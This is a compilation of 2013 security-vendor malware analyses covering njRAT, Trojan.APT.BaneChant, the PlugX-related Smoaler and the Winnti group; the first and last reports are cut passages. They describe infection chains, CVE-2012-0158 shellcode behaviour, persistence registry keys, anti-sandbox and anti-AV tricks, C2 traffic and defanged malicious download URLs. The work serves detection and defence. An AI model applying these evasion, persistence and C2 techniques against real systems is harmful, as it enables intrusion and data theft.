written approval of Fidelis Security Systems, Inc.While we have done our best to ensure that the material found in this document is accurate, Fidelis Security Systems, Inc. makes no
guarantee that the information contained herein is error free.<footer>
Copyright © 2013 General Dynamics Fidelis Cybersecurity Solutions                                                    Rev.This document will provide detailed information about the njRAT's functionality, file system
indicators, network indicators, some of the campaign IDs observed, MD5 hashes, and domains.It will also go over a detailed analysis of one of the malware variants.</section>
<section>
<heading>Threat Overview</heading>
The "njRAT" is a robust remote access trojan that once it reaches and infects the end-point,
allows the attacker to have full control over the Victim system.With this access, the attacker can
start scanning other systems in the victim network to perform lateral movement.We will start this section by performing analysis on the following "njRAT" sample:
              -   Filename:          Authorization.exe
              -   MD5:               1d3baedd747f6f9bf92c81eb9f63b34b

The "Authorization.exe" njRAT malware was embedded and dropped in the victim system by the
following file: "Authorization form may - 2013 - 115444.scr" (MD5:
63781fe1932e612c6c29225d25515111).The next section (Indicators & Mitigation Strategies), will provide information about other variants
of the malware obtained.<heading>Summary</heading>

    The "Authorization.exe" malware sample was created with version V.0.5 of this RAT.The
    njRAT application was developed with VB.NET (Visual Basic .NET).When the malware connects to the Command & Control (CnC) server, the attacker is able to
    perform the following actions from the njRAT CnC server GUI:
    <list>
    -    Open a 'File Manager' window to manipulate files
            o This window allows the attacker to Upload & Download, Run, Delete, Edit,
                Rename, Copy, Cut, Paste, and Empty files.At the moment of writing this report, the functionality was
                not confirmed.When the option is selected, the malware searches Mozilla
                Firefox, Google Chrome, Opera directories.It stores the logged keystrokes
    in the following file: "[CWD]\.tmp".When the malware is dropped by the "Authorization form
    may - 2013 - 115444.scr" carrier file, the logged keystrokes are stored in:
    "C:\Extracted\.tmp".The IP address used by the Command & Control (C2) node appears to be under an IP range
    owned by: "Palestinian Internet Services, P. O.BOX 5111 Gaza City, Palestine".Variants of this malware have been observed by the community since at least 2012.The
    malware appears to be known by the community as: njRAT, MSIL/Bladabindi, and
    Backdoor.LV.Once the system is infected again, it will beacon to the C2
              node.The attacker tries to trick the user by using different icons for the malware.Various samples
    were observed with MS Word and PDF icons.The following is a screenshot of how the file
    will look like to a normal user:




    When the system is configured to show file extensions, the EXE extension is now revealed:




    When the malware connects to the C2 node, it will send information about the victim system,
    malware version, open windows, etc.The following is the network traffic observed:
<list>
        lv|'|'|TndfQzQyNjRFQkI=|'|'|VICTIM|'|'|Examiner|'|'|2013-06-21|'|'|USA|'|'|Win XP ProfessionalSP2
        x86|'|'|No|'|'|0.5.0E|'|'|..|'|'|Y3B0YnRfUHJvY2Vzc19SZWdpc3RyeV9GaWxlX0luZm8ubG9nIC0gTm90ZXB
        hZA==|'|'|[endof]act|'|'|
        Y3B0YnRfUHJvY2Vzc19SZWdpc3RyeV9GaWxlX0luZm8ubG9nIC0gTm90ZXBhZA== [endof]
</list>


<footer>
Copyright © 2013 General Dynamics Fidelis Cybersecurity Solutions                             Rev.The decoded data reveals the following string:
                                "Nw_C4264EBB".It appears that the string before the "_" (Nw) can be used by the
                                attacker to identify the attack campaign.This is configured through the "njRAT"
                                builder GUI.The second portion ("C4264EBB") is the Volume Serial Number of the
                                victim system
   VICTIM                       Computer name
   Examiner                     Username
   2013-06-21                   Date Modified attribute of the malware.This date will match the first time the file is
                                created in the victim system
   USA                          System locale
   Win XP ProfessionalSP2       Operating System Information
   x86
   No                           Report if the system has a camera
   0.5.0E                       Malware version
   Y3B0YnRfUHJvY2Vzc19S         Base64 encoded data.The decoded data reveals the following string:
   ZWdpc3RyeV9GaWxlX0lu         "cptbt_Process_Registry_File_Info.log - Notepad".In this case, the decoded string
   Zm8ubG9nIC0gTm90ZXB          is just information about an open window used by the examiner to capture system
   hZA==                        activity
 </table>

    Information sent by the attacker on opened windows in the system could inform him/her of his
    malware being analyzed and allowed to connect to the C2 node.For example, if Wireshark,
    Filemon, Regmon, and IDA are opened in the system when the analyst executes the
    malware, this will quickly let the attacker know that someone is performing reverse
    engineering of his malicious code.<footer>
Copyright © 2013 General Dynamics Fidelis Cybersecurity Solutions                                         Rev.The domain currently resolves to the following IP address: "112.213.89.144", but at
    some point, the domain was associated with the following IP address: "31.170.165.90".The first table
contains the MD5 hash , size, domain, port, njRat version, and campaign ID.The second table
contains information about the file system artifacts (kelogger file location, files created).The third
table contains information about registry key entrenchment for persistence.Then, a list of network
indicators will be provided to assist network defenders with the creation of signatures to be
deployed to the sensors.<footer>
Copyright © 2013 General Dynamics Fidelis Cybersecurity Solutions                        Rev.The Keylogger file location referred to as "[CWD]\.tmp", refers to
      the location from which the original malware is executed.It was observed that this was used
      when the malware was embedded in a legitimate looking application, and the kelogger files
      get created in the directory of that application (i.e.C:\Program Files\Facebook\QuadAtom\.tmp).</box>
<table>

MD5                                    Keylogger File                 Created Malware

2013385034e5c8dfbbe47958fd821ca0       %APPDATA%\ja33kk.exe.t       %APPDATA%\ja33kk.exe
                                       mp                           C:\Documents and Settings\%USERNAME%\Start
                                                                    Menu\Programs\Startup\9758a8dfbe15a00f55a11c8306f80da1.Size: 44544)


<footer>
      Copyright © 2013 General Dynamics Fidelis Cybersecurity Solutions                              Rev.TURQUOISE = Response from Victim).These artifacts will hopefully assist the research community with generation of network signatures
    to detect this threat:
<list>
    -      File Manager window

           In this case, the "C:\" directory of the Victim system was browsed and a folder named
           "njRAT_Directory_Created" was created in it.</list>
        The following table provides information about some of the encoded data which is files and
        directories in the folder browsed.This application was executed in the Victim's machine.The Victim system
        responded with the name of the new window opened:
<table>
                                           Encoded Data                               Decoded Data

                               QmluVGV4dCAzLjAuMw==                         BinText 3.0.3
</table>

        The other portion of the traffic between the text "TRUNCATED BY THE EXAMINER" is the
        encoded executable (BinText) uploaded to the Victim system.[endof]!|'|'|0|'|'|220,160[endof]CA
    M|'|'|192.168.1.100:1260|'|'|!|'|'|![endof]!|'|'|0|'|'|220,160[endof]CAM|'|'|192.168.1.100:1260|'|'|!|'|'|![endof]!|'|'|0|'|'|220,160[en
    dof]CAM|'|'|192.168.1.100:1260|'|'|!|'|'|![endof]!|'|'|0|'|'|220,160[endof]CAM|'|'|192.168.1.100:1260|'|'|!|'|'|![endof]!|'|'|0|'|'|220,
    160[endof]CAM|'|'|192.168.1.100:1260|'|'|!|'|'|![endof]!|'|'|0|'|'|220,160[endof]CAM|'|'|192.168.1.100:1260|'|'|!|'|'|![endof]!|'|'|0
    |'|'|220,160[endof]CAM|'|'|192.168.1.100:1260|'|'|!|'|'|![endof]!|'|'|0|'|'|220,160[endof]CAM|'|'|192.168.1.100:1260|'|'|!|'|'|![end
    of]!|'|'|0|'|'|220,160[endof]CAM|'|'|192.168.1.100:1260|'|'|!|'|'|![endof]!|'|'|0|'|'|220,160[endof]CAM|'|'|192.168.1.100:1260|'|'|!|
    '|'|!?\C:\WINDOWS\system32\csrss.exe,640|'|'|C:\WINDOWS\system32\rundll32.exe,188
    0|'|'|\??\C:\WINDOWS\system32\winlogon.exe,720|'|'|System,4|'|'|Idle,0|'|'|C:\WINDOWS\system32\svchost.exe,1252|'|'|
    C:\WINDOWS\System32\alg.exe,1872[endof]P[endof]P[endof]k|'|'|1396[endof]proc|'|'|217.66.231.100:1185|'|'|RM|'|'|13
    96[endof]



        In the above case, the Process Listing window opened in the Attacker's VM was used to kill a
        process in the Victim VM.Process information:

                  o    Process path:          C:\WINDOWS\system32\notepad.exe
                  o    Process ID:            1396
<footer>
Copyright © 2013 General Dynamics Fidelis Cybersecurity Solutions                                               Rev.The data decodes to:
<table>
                   Encoded Data                                                Decoded Data

                                                      13/06/06 WINWORD Document1 - Microsoft WordHello World!Fidelis XPS sensors detected the NJC242.exe/njRAT malware as "Trojan.Win32.Jorik.Agent.rkp".Fidelis XPS is capable of detecting this threat regardless of delivery method employed by the
Threat Actors responsible.Fidelis XPS can detect and alert on executables such as the "njRAT"
malware multiple layers deep inside of archive files (i.e.ZIP), or even XOR'ed inside of a
weaponized MS Office document or Adobe PDF File.The Fidelis Threat Research and Network
Forensics and Incident Response teams will continue to actively monitor the ever-evolving threat
landscape for the latest threats to our customers’ network security.</section>


<footer>
Copyright © 2013 General Dynamics Fidelis Cybersecurity Solutions                                      Rev.2013-06-25
Threat Advisory #1009                            Page 27 of 27                                  “njRAT” Uncovered
</footer>

</doc><doc>
<header>Trojan.APT.BaneChant: In-Memory Trojan That Observes for
Multiple Mouse Clicks</header>
<section>
<heading>Summary</heading>

Last December, our senior malware researcher (Mr. Abhishek Singh) posted an article about a Trojan
which could detect mouse clicks to evade sandbox analysis.Interestingly, we have found another spear
phishing document that downloads malware which incorporates improved mouse click detection anti-
sandboxing capability.It also leverages multiple advanced evasion techniques to achieve stealth and
persistent infection.The name of malicious document is translated to be “Islamic Jihad.doc”.Hence, we
suspect that this weaponized document was used to target the governments of Middle East and Central
Asia.This new malware is significant for several reasons:

        It detects multiple mouse clicks: In the past, evasion methods using mouse clicks only detected
        a single click, making the malware fairly easy to overcome.The callback goes to a legitimate URL: Often when malware performs its callback, the
        communication goes directly to the CnC server.In this case, the callback goes to a legitimate URL
        shortening service, which would then redirect the communication to the CnC server.Automated
        blocking technologies are likely to block only the URL shortening service and not the CnC server.It has anti-forensic capability: This malware doesn’t kick into high gear immediately.Instead it
        requires an Internet connection for malicious code to be downloaded to the memory and
        executed.Unlike predecessors that are very obvious and immediately get to work, this malware is
        merely a husk and its true malicious intent could only be found in the downloaded code.This
        prevents forensic investigators from extracting the “true” malicious code from the disk.Overall, this malware was observed to send information about the computer and set up a backdoor for
remote access.This backdoor provides the attacker the flexibility on how malicious activities could be
executed.</section>
<section>
<heading>Technical Analysis: How Does it Work?</heading>

After opening this malicious document, it attempts to download an XOR encoded binary (using a two byte
XOR key) for the stage one payload.It was also observed that the attacker leveraged a shortened URL to
“hide” malicious domains from automated analysis technologies.After investigation, the malicious
domain was analyzed to be recently registered.See Figure 1 for the first stage download scenario.<figure></figure>
<caption>Figure 1 Stage One Download</caption>

The attacker has designed the stage one malware to be merely a husk.Having the decrypted executable file
alone would not be useful in understanding its intent.It is because a majority of the malicious code is only
available after downloading the second stage payload.The second stage payload was available as a fake
“JPEG” file from the malicious server.By designing the malware this way, it makes it harder to perform
incidence response and facilitates ease of update of malicious code.Again, in this second stage download,
the malicious domain was not found in the malware.It made use of the dynamic DNS service provided by
“NO-IP” to indirectly access the malicious domain.See Figure 2 for the second stage download scenario.The technical details of each component (shellcode and payload) will be further elaborated.<figure></figure>
<caption>Figure 2 Stage Two Download</caption>
</section>
<section>
<heading>Shellcode Analysis</heading>

The spear phishing document was in RTF format which as designed loads MSCOMCTL.ocx and exploits
CVE 2012-0158.By executing return at 0x27606EFF, it will load EIP with address 0x27583C30 which is
translated to be JMP ESP to execute shellcode in the stack.See the figure below.<figure></figure>
<caption>Figure 3 Stack Corruption To “JMP ESP”</caption>

Like most modern shellcode, its stub decrypts its body using a simple XOR key (see Figure 4).By stepping
through the shellcode, it attempts to download hxxp://ow.ly/iGKKT and saves it to the temp directory
with a file name prefixed with “moo”, e.g., “moo1.tmp” (see Figure 5).It is important to note that “ow.ly” is
not a malicious domain.Instead, it is a URL shortening server.It is believed that the rational for such
indirect access is to defeat automated URL blacklisting.Figure 6 depicts how a malicious URL could be
shortened using this service.<figure></figure>
<caption>Figure 4 Single Byte XOR Key 0xF1</caption>


<figure></figure>
<caption>Figure 5 URLDownloadToFileA</caption>



<figure></figure>
<caption>Figure 6 URL Shortening Service</caption>

From the network traffic, it is obvious that the real malicious content is located at
hxxp://symbisecure.com/update/winword.pkg (see Figure 7).As an excecutable file usually contains
many zeros in series, the zeros would become the XOR key when XOR encoded.For example, 0xAA xor
0×00 equals to 0xAA.By examining the content using a hex editor, it is obvious that there are many “9E
44” repeated.Hence, by trying 0x449E (little endian) as an XOR key, it would reveal that it is a PE file.At
offset zero, it is decrypted to be “MZ”; at offset 0x3C, it is decrypted to be 0x00000E0; and at
0x000000E0, it is decrypted to be PE (see Figure 8).By generalizing this idea, the single or double byte XOR key can be seen as a dword XOR key as it repeats
over itself.For example, 0x449E XOR key could be seen as 0x449E449E.By counting the DWORD with
the highest occurance, it could be a probable XOR key if the file is XOR encrypted.This should work for
samples that are (1, 2 or 4, but not 3 bytes) XOR encrypted.<figure></figure>
<caption>Figure 7 Stage 1 Download Content</caption>
<figure></figure>
<caption>Figure 8 Double Byte XOR Encrypted Payload</caption>
</section>
<section>
<heading>Payload Analysis</heading>

Even though “winword.pkg” is an executable husk to host malicious code downloaded at the second stage,
it contains a mouse-click check to detect human behaviors.Only if the number of left clicks is three or
more, will the malware proceed further to download the second stage payload – the true malicious code
(see Figure 9 and Figure 10).<figure></figure>
<caption>Figure 9 Track Number of Left Clicks</caption>



<figure></figure>
<caption>Figure 10 Proceed If Left Click Count Is Three Or More</caption>

After the malware detects sufficient mouse clicks, it proceeds to decrypt its malicious URL to download
the second stage payload (see Figure 11).By following the TCP stream (see Figure 12) and examining the
header of the downloaded JPG file, it is obvious that downloaded content is not a JPEG file.By doing so, it
effectively downloaded an executable content that is not conformed to PE format to defeat network binary
extraction.A legitimate JPG file should contain the byte sequence “FFD8FFE0xxxx4A46494600” at
offset zero, where “4A464946” corresponds to “JFIF”.Below is the hardcoded URL and user-agent that
is used by this malware sample.URL: hxxp://kibber.no-ip.org/adserv/logo.jpg
      User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV2)



<figure></figure>
<caption>Figure 11 Malicious Domain Decryption</caption>
<figure></figure>
<caption>Figure 12 Fake JPG</caption>

After the JPG file is downloaded and executed directly in the memory, it achieves persistency by creating a
shortcut link file at the start up folder.This link file will execute a copy of itself located at
“C:\ProgramData\Google2\GoogleUpdate.exe” (see Figure 13).It would look legitimate to users as it
masquerades as a legitimate Google Updater.It “would” appear normal if it attempts to access the
Internet.In comparison, the real “GoogleUpdate.exe” resides in “program files” instead “program data”
directory (see Figure 14).<figure></figure>
<caption>Figure 13 Persistency Mechanism</caption>



<figure></figure>
<caption>Figure 14 Genuine GoogleUpdate.exe</caption>

The downloaded “JPG” file was analyzed to be a backdoor in the victim’s machine.It lists the running
processes, IP configuration, and directories of root drives (C to H) as depicted in Figure 15.This
information is posted to hxxp://symbisecure.com/adserv/get.php in Base-64 format.After decoding, it is
interesting that it begins with a Tag named “BaneChant”.After doing a quick search, it seems to be a
sound track composed by Hans Zimmer for the movie “The Dark Knight Rises” (see Figure 16).This is the
reason we name this malware Trojan.APT.BaneChant.<figure></figure>
<caption>Figure 15 Commands Executed</caption>
<figure></figure>
<caption>Figure 16 Exfiltrated Computer Information</caption>

As depicted in Figure 17, the malware could perform other tasks as listed below.1.Command ‘g’: Download and execute a file.The downloaded file has a temporarily file name
      prefixed with “java”.2.Command ‘i’: Run downloaded code (fileless) as a separate thread.The user-agent used is
      “Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko)”.3.Command ‘x’: Download and execute, follow by an uninstallation of “GoogleUpdate.exe”.The
      downloaded file has same prefix “java”.4.Command ‘u’: Uninstall “GoogleUpdate.exe”
<figure></figure>
<caption>Figure 17 Backdoor Access</caption>
</section>
<section>
<heading>Conclusion</heading>

As defense technologies advance, malware also evolves.In this instance, we could see that the malware
has performed a number of tricks to defeat detection.It attempts to:

   1.Evade sandbox by detecting human behaviors (multiple mouse clicks);
   2.Evade network binary extraction technology by performing multi-byte XOR encryption on
      executable file;
   3.Social engineer user into thinking that the malware is legitimate;
   4.Avoid forensic and incidence response by using fileless malicious codes; and
   5.Prevent automated domain blacklisting by using redirection via URL shortening and Dynamic DNS
      services.</section>
<footnote>This entry was posted in Advanced Malware, Targeted Attack by Chong Rong Hwa.Bookmark the
permalink.</footnote>

</doc><doc>
<section>

<heading>                      The PlugX malware revisited:
                         introducing “Smoaler”
</heading>
           By Gabor Szappanos, Principal Researcher, SophosLabs

                                                 July 2013



In a recent SophosLabs article about the PlugX malware family <fn>A</fn>, we concluded
with these words:

    There is no doubt that PlugX development will go on, and new features and
    tricks will be introduced.We'll keep an eye on them, and if any interesting or important new features
    appear, we'll be sure to let you know.Fast forward just under two months, and we're ready to tell you the next stage in
this ongoing saga.The malware family we'll be looking at in this report is known as Smoaler, and it
shares many features with PlugX, notably that:

    • Smoaler relies on the same vulnerability, CVE-2012-0158.<fn>B</fn>

    • Smoaler uses the same exploit shellcode.• Smoaler uses similar visual distractions, or decoys, with a Tibetan theme.• Smoaler uses the same initial malware modules to initiate infection.Thereafter, the new malware follows a different path to the PlugX samples we
looked at last time.We shall analyse the “what happens next” component of Smoaler later on.To clarify the terminology we have used above, remember that:

    • A vulnerability is a software bug that could potentially be abused to make
       your computer behave insecurely.• An exploit is a real-world trick by which a vulnerability can be activated to
       bypass security.<footer>
© 2013 Sophos Ltd. All rights reserved.Visit www.sophos.com/legal for more information.1</footer>
<header>
PlugX revisited: introducing “Smoaler”                                              Gabor Szappanos, SophosLabs
</header>

    • Shellcode is runnable program code delivered inside a file that is supposed
       to be plain data, and therefore implicitly safe, but that can be executed
       without the user's knowledge or consent by exploiting a vulnerability.• Initial malware modules, also called droppers, are malware components,
       often delivered or activated by shellcode, used to deliver the full malware, or
       payload, that the attacker wants to install.</section>
<section>
<heading>
How Smoaler arrives
</heading>
The Smoaler samples seen by SophosLabs were all packaged into files with the
extensions .DOC or .DOCX.These extensions usually denote files specific to
Microsoft Word that were created by Microsoft Word.Despite the extensions, however, all the files were actually in Rich Text Format
(RTF), a text-based file format for representing documents.<figure></figure>

                  Fig 1: RTF content of one of the Smoaler samples received by SophosLabs


We assume that the attackers chose RTF because its text structure makes it easier
to manipulate to create a working exploit for the CVE-2012-0158 vulnerability.Visit www.sophos.com/legal for more information.After infecting your computer, the shellcode loads a new copy of Word to display a
decoy document that is hidden inside the malicious file.You will notice only notice a brief flicker when the old instance of Word closes and
the new one with the decoy opens.<figure></figure>

                                    Fig 2: Sample Smoaler decoy documents


The decoy documents are all unexceptional, uninfected documents with content
that matches the filenames given to the malicious RTFs.(See Fig 2.)<footer>
© 2013 Sophos Ltd. All rights reserved.Visit www.sophos.com/legal for more information.3</footer>
<header>
PlugX revisited: introducing “Smoaler”                                              Gabor Szappanos, SophosLabs
</header>

In preparing the decoy for display, the malware overwrites the infected RTF file
with the contents of the decoy (which is in DOC format), thus removing one useful
piece of evidence that might otherwise help pinpoint the source of infection.</section>
<section>
<heading>
The shellcode
</heading>
The executable code that kicks off infection is the same as was used in PlugX,
being byte-for byte identical (see Fig 3) to the shellcode from PlugX 6.0 [A].<figure></figure>
                         Fig 444: The PlugX 6.0 and Smoaler shellcodes are identical

                           Fig 3: The PlugX 6.0 and Smoaler shellcodes are identical


￼This shellcode is unusual for its use of LZNT1 compression for the embedded
 executable payload.This technique has not been observed in any other APT
 (Advanced Persistent Threat) attacks.The shellcode decompresses an embedded PE file, writes it into the %TEMP% folder
with the name DW20.DLL (this mimics the filename used by the Dr. Watson utility
on Windows that pops up when a program crashes), and runs it.</section>
<section>
<heading>
First-stage dropper
</heading>
<table>
                      Filename     DW20.DLL
                                   Troj/Plugx-I
           Sophos detections
                                   Troj/Plugx-K
</table>

The first-stage payload created by the shellcode contains another program file
embedded as data.It locates this in its own executable file, drops it to disk (which is where the name
dropper comes from for this sort of malware component), and runs it.<footer>
© 2013 Sophos Ltd. All rights reserved.Visit www.sophos.com/legal for more information.4</footer>
<header>
PlugX revisited: introducing “Smoaler”                                              Gabor Szappanos, SophosLabs
</header>
There are two main sorts of dropper, detected by Sophos as Troj/Plugx-I and
Troj/Plugx-K. (See Fig 4.)The names reflect the similarity, thus far, to earlier PlugX
malware.<figure></figure>
                    Fig 4: Side-by-side pseudocode for Smoaler first-stage dropper variants


But what happens next is quite different from a PlugX attack, which is why this
malware has been given the general name Smoaler, rather than PlugX.</section>
<section>
<heading>
The intermediate infector
</heading>
<table>
                      Filename     Random temporary name (deleted after use)
            Sophos detection       Mal/Smoaler-A
</table>

The temporary file dropped by DW20.DLL contains a compressed DLL (dynamic link
library: a special sort of program file) stored in its resources.This compressed
program is unpacked using code built on the stack.This component decodes the Command-and-Control (C&C) server names that the
final malware will use, and saves them to the registry entry HKCU\Software\
Microsoft\Windows Media\XC.(See Fig 5.)C&C servers are the computers to which infected computers, often called bots or
zombies, connect in order to fetch instructions on what to do next.Putting the C&C
server names in the registry, rather than in the zombie executable itself, means
that if the user becomes suspicious and submits the malware file to a security
vendor, the locations of the C&C servers will not be revealed.The data in the registry entry is obscured by flipping the least significant bit of the
non-zero bytes (i.e.XORing them with 0x01).This provides a light disguise against
an inquisitive user.<footer>
© 2013 Sophos Ltd. All rights reserved.Visit www.sophos.com/legal for more information.5</footer>
<header>
PlugX revisited: introducing “Smoaler”                                              Gabor Szappanos, SophosLabs
</header>

<figure></figure>

                         Fig 5: Smoaler registry entry used to store C&C server names


After storing the C&C names in the registry, the intermediate infector loads the
dropped DLL using the LoadLibrary() Windows API call.The intermediate infector is deleted from the system after execution.</section>
<section>
<heading>
Main malware component
</heading>
<table>
                      Filename     Randomly-generated name
            Sophos detection       Troj/Smoaler-A
</table>

The DLL dropped by the intermediate infector is the principal component of
Smoaler.The DLLs created during infection are variable in size, and huge, ranging from 20
MBytes to 50 MBytes.This is not because they are complex and packed with functionality: the useful
content of Smoaler is less than 40 KBytes.The bulk of each DLL consists of a
number (two to six) binary resources of 5 MBytes to 10 MBytes each.These
resources are filled with zero bytes, entirely for the purpose of bulking up the file.We assume that the purpose of deliberately bloating the main DLL is to disguise its
original source, since even a suspicious user might not connect a multi-megabyte
DLL with the original infectious RTF of a few hundred kilobytes.(The original RTF is
also replaced with the decoy DOC file after infection, further diverting attention
from the origin of the malware.)<footer>
© 2013 Sophos Ltd. All rights reserved.Visit www.sophos.com/legal for more information.6</footer>
<header>
PlugX revisited: introducing “Smoaler”                                              Gabor Szappanos, SophosLabs
</header>

When the DLL first runs, it installs itself permanently into two places on the
victim's computer:

    • C:\Documents and Settings\All Users\Application Data\Microsoft\
      Windows\Burn\%COMPUTERNAME%.dll

(%COMPUTERNAME% is generated by querying the name of the computer.)• C:\Documents and Settings\All Users\Application Data\Microsoft\
      Windows\LiveUpdata_Mem\%RANDOM%.dll

(The %RANDOM% part of the name is variable, e.g.B6go3s_One.dll or 7n5HjV.dll.)Two or three copies of the DLL are dropped.They typically differ in size, because
the zero-byte resource padding may vary in each file.The DLL is added as a registry value called %COMPUTERNAME% in the registry key
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\run.This provides what is known as persistence, meaning that the malware is
automatically re-loaded every time the victim reboots or logs on.(See Fig 6.)<figure></figure>


                        Fig 6: Smoaler registry persistence on a computer named XP3

Note that Smoaler is launched using the Windows utility rundll32.exe, because
DLLs cannot execute on their own.They require a host program inside which to
run.When connecting to its C&C servers, Smoaler injects itself into the process
IEXPLORE.EXE.This is a common trick used by malware to make its traffic appear
to originate from a browser, thus arousing much less suspicion.While running, however, Smoaler keeps a lookout for processes called vsserv.exe,
fsdfwd.exe, AvastSvc.exe, uiWatchDog.exe, and avp.exe.It avoids injecting
itself into Internet Explorer if any of them are active.<footer>
© 2013 Sophos Ltd. All rights reserved.Visit www.sophos.com/legal for more information.7</footer>
<header>
PlugX revisited: introducing “Smoaler”                                              Gabor Szappanos, SophosLabs
</header>

These processes belong to various security products, so this is a malware
precaution often jocularly called anti-anti-virus, intended to avoid suspicious
activity that might attract the attention of security software.After installing itself, Smoaler attempts to connect to its C&C servers.The domain
names it uses are already known from earlier Tibet-related malware attacks:
dtl.dnsd.me, dtl.eauto.com and dtl6.moo.com.</section>
<section>
<heading>
What happens next?</heading>
Unfortunately, we can't say precisely how an infected computer will behave if
Smoaler gets this far.That is because the content that the primary Smoaler DLL fetches from its C&C
servers is whatever malware the attackers choose to serve up next.Worse still, the programs downloaded by Smoaler are not in regular EXE or DLL
format.Firstly, the downloads are encrypted; secondly, their headers are stripped off so
that, even decrypted, they are not immediately obvious as programs; thirdly, they
are loaded directly into, and run directly from, memory, rather then being written
to disk and launched via the Windows API.That means that if you kill off the Smoaler process and delete its primary
executable, as you will almost certainly want to do if you find out that you are
infected, you may no longer have a complete copy of the malware to submit for
analysis.In this way, the Smoaler authors avoid showing all the cards in their hand at once,
in the hope of staying one step ahead.However, this multi-stage approach also has a significant disadvantage for
cybercriminals: there are now multiple points in the attack at which you can spot
an anomaly, intervene, and win.Prevention is better than cure

Malware like Smoaler is a strong reminder of why proactivity and prevention are
better than cure: once you are infected, it can be hard to go back and unravel
what happened, because of the tricks that the malware uses along the way.</section>
<footer>
© 2013 Sophos Ltd. All rights reserved.Visit www.sophos.com/legal for more information.Visit www.sophos.com/legal for more information.9</footer>


</section>
</doc>The subject of this research
project is a series of targeted attacks against private companies around the world.In the research, we reveal activity of one of the hacking groups which has Chinese origins.This group was named
"Winnti".According to our estimates, the Winnti group has been active for several years and specializes in cyber-attacks
against the online video game industry.The main objective of the group is to steal source code of online game
projects as well as digital certificates of legitimate software vendors.Besides that, they are deeply interested in
the set-up of network infrastructure (including production gaming servers) and new developments such as
conceptual ideas, design and more.We aren’t the first to investigate the attacks attributed to the Winnti group..It is known that, at least in 2010, the
U.S.- based company HBGary investigated information security incidents related to the Winnti group at one of
HBGary's customers – an American video game production company.</section>

<section>
<heading>In the beginning …</heading>
In the autumn of 2011, a Trojan was detected on a large number of computers – all of them linked by the fact that
they were used by players of a popular online game.It emerged that the piece of malware landed on users’
computers as part of a regular update from the game’s official update server.Some even suspected that the
publisher itself was spying on its customers.However, it later became clear that the malicious program ended up
on the users’ computers by mistake: the cybercriminals were in fact targeting the companies that develop and
release computer games.The computer game publisher whose servers spread the Trojan asked Kaspersky Lab to analyze the malicious
program that was found on its update server.It turned out to be a DLL library compiled for a 64-bit Windows
environment and even used a properly signed malicious driver.The malicious DLL infected gamers’ computers running under either 32-bit or 64-bit operating systems.It could not
start in 32-bit environments, but it could, under certain conditions, launch without the user’s knowledge or
consent in 64-bit environments, though no such accidental launches have been detected.The DLL contained a backdoor payload, or, to be exact, the functionality of a fully-fledged Remote Administration
Tool (RAT), which gave the cyber-criminals the ability to control the victim computer without the user’s knowledge.The malicious module turned out to be the first Trojan for the 64-bit version of Microsoft Windows with valid
digital signature that we have seen.We used to see similar cases before, but in all previous incidents we have seen
digital signature abuse, there were only 32-bit applications.At an early stage of our research, we identified a number of similar backdoors, both 32-bit and 64-bit, in our
collection of malware samples.Thesewere detected under various verdicts.We grouped them together into a
separate family.Symantec appears to be the first to name these malicious programs; we kept Symantec’s name –



<noncontent>PAGE 2| “Winnti” | More than just a game</noncontent>
Winnti – in the name of the malware family we created: Backdoor.Win32(Win64).Winnti.As for the people behind
these attacks involving this remote administration tool, we ended up calling them “the Winnti group”.Interestingly, the digital signature belonged to another video game vendor - a private company known as KOG,
based in South Korea.The main business of this company was MMRPG (massively multi player online role-playing
games) games, which was identical to the business area of the first victim.We contacted KOG, whose certificate was used to sign malicious software and notified Verisign, which issued the
certificate for KOG.As a result, the certificate was revoked.</section>


<section>
<heading>Digital Certificates</heading>

When we discovered the first stolen digital certificate, we didn't realize that stealing the certificates and signing
malware for upcoming attacks against other victims was the modus operandi of that group.In eighteen months,
we manage to discover more than a dozen compromised digital certificates.Moreover, we found that those digital certificates seemed to have been used in attacks organized by other hacking
groups, presumably coming from China.For example, an attack against South Korean social networks Cyworld and Nate in 2011
(http://www.bbc.co.uk/news/technology-14323787) - the attackers used a Trojan that was digitally signed using
the certificate of YNK Japan Inc gaming company.)A digital certificate of the same company was used recently (March 2013) in Trojans targeting Tibetan and Uyghur
activists
(https://www.securelist.com/en/blog/208194165/New_Uyghur_and_Tibetan_Themed_Attacks_Using_PDF_Exploi
ts).In fact, this story has long roots dating back to 2011.We highly recommend reading this Norman blog post of a
similar incident here: http://blogs.norman.com/2011/security-research/invisible-ynk-a-code-signing-conundrum.<noncontent>PAGE 3| “Winnti” | More than just a game</noncontent>
At the same time, in March 2013, Uyghur activists were targeted by another malware which was digitally signed by
another gaming company called MGAME Corp according to http://www.f-
secure.com/weblog/archives/00002524.html

 We believe that the source of all these stolen certificates is same group which we call Winnti.This group either has
close contacts with other Chinese hacker groups or sells the certificates on the black market in China.In this context, it seems unlikely that a commercial company would be at risk
unless it was operating on the scale of Google, Adobe or The New York Times, which was recently targeted by a
cyber-attack, and this perception is reinforced by the publicity that attacks on corporations and government
organizations usually receive.However, any company with data that can be effectively monetized is at risk from
APTs.This is exactly what we encountered here: it was not a governmental, political, military, or industrial
organization.The target was specifically gaming companies.Analyzing the Winnti samples helped to identify who and what were the targets.We found that we were dealing
with targeted attacks: the Winnti team infects companies that develop and release computer games.It appears the
team has been active for quite a while – since 2009.<noncontent>PAGE 4| “Winnti” | More than just a game</noncontent>
It’s difficult to name all the victims of the Winnti team.Judging by the information that we have at our disposal –
namely the tags within malicious programs, the names of the C&C domains, the companies whose digital
certificates were stolen to sign malware, and the countries where detection notifications came from – we can say
that at least 35 companies were infected by the Winnti malware at some time.<caption>Countries where gaming companies have been affected</caption>

This geographic diversity is hardly surprising.Often, gaming companies (both publishers and developers) are
international, having representatives and offices worldwide.Also, it is common practice for gaming companies
from various regions to cooperate.The developers of a game may be located in a different country from its
publisher.When a game eventually reaches markets in regions away from its initial ‘home’, it is often localized and
released by other publishers.In the course of this cooperation, the partner companies often grant each other
access to network resources to exchange data associated with the gaming content, including distribution kits,



<noncontent>PAGE 5| “Winnti” | More than just a game</noncontent>
gaming resources, resource assembly kits, etc.If one company in the network gets infected, it’s easy for the
cybercriminals to spread the infection throughout the partnership chain.</section>

<section>
<heading>Winnti C&C Structure</heading>

During the investigation, we identified more than a hundred malicious programs, each individually compiled to
attack a particular company.Typically, separate command-and-control (C&C) domains were assigned to each
targeted company.Virtually all the C&C domains were arranged as follows: a second-level domain was created
